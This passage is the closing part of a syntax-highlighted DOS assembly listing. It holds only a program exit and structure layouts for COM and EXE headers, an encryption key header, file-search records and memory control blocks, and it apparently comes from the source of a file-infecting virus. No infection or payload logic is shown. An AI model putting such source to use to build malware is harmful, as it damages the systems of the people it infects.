                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">



</span><span class="sc1">; ------------- SOME STRUCTURES ---------------------------------------------</span><span class="sc0">


</span><span class="sc5">COM_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Jump</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Displacement</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COM_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EXE_Mark</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Marker valid .EXE-file: MZ or ZM.</span><span class="sc0">
</span><span class="sc5">Image_Mod_512</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_512_Pages</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Items</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Size_Mem</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Min_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_IP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_CS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Table</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Encrypt_Header</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Header_Key</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Slider</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Encrypt_Header</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_FN_Handle</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Handle_Reserved</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Handle_Attr</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Time</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Date</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Size</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Name</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_FN_Handle</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_FN_FCB</span><span class="sc0">     </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FCB_Drive</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Name</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Ext</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Attr</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Reserved</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Time</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Date</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Start_Clust</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Size</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_FN_FCB</span><span class="sc0">     </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Push_All_Stack</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Reg_ES</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DS</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DI</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_SI</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_BP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_SP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_BX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_CX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_AX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_Flags</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_Ret_Addr</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Push_All_Stack</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_FN_Win95</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Win95_Attr</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Created</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Access</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Time</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Date</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Size_Hi</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Size_Lo</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win95_Reserved</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Win95_Win_Name</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Win95_DOS_Name</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_FN_Win95</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">MCB_Type</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; M = not last block, Z = last block.</span><span class="sc0">
</span><span class="sc5">MCB_PSP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PSP-segment of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Size of block in paragraphs.</span><span class="sc0">
</span><span class="sc5">MCB_Dunno</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Don't care, don't need it.</span><span class="sc0">
</span><span class="sc5">MCB_Program</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Filename of program of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
